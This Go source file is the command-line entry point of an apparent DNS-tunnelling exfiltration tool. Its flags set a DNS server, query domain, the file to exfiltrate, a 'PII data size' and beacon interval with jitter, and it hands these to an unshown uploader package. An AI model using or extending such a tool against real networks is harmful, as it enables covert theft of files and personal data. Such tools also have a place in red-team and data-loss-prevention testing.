package main

import (
	"flag"
	"io"
	"os"
	"log"

	"../uploader"
)

type Config struct {
	ip string
	port int
	domain string
	size int
	file string	
	offset int
	jitter float64 
}

var config Config

func main() {
	//Command line switches
	var (
		ip = flag.String("ip", "0.0.0.0", "IP address of DNS Server")
		port = flag.Int("port", 53, "Port of DNS Server")
		domain = flag.String("domain", "test.service", "Domain name to query")
		size = flag.Int("size", 100, "PII data size to exfiltrate")
		file = flag.String("f", "", "Full path to file to exfiltrate")
		offset = flag.Int("i", 0, "Min beacon interval (seconds)")
		jitter = flag.Float64("j", 0.0, "Beacon interval jitter fraction between 0 and 1")
	)

	flag.Parse()

	config = Config{*ip, *port, *domain, *size, *file, *offset, *jitter}

	logfile, _ := os.OpenFile("run.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
    defer logfile.Close()
    mw := io.MultiWriter(os.Stdout, logfile)
	log.SetOutput(mw)

	uploader := uploader.NewDnsTxtUploader(config.ip, config.port, config.domain, config.size, config.file, config.offset, config.jitter)

	uploader.Upload()
}


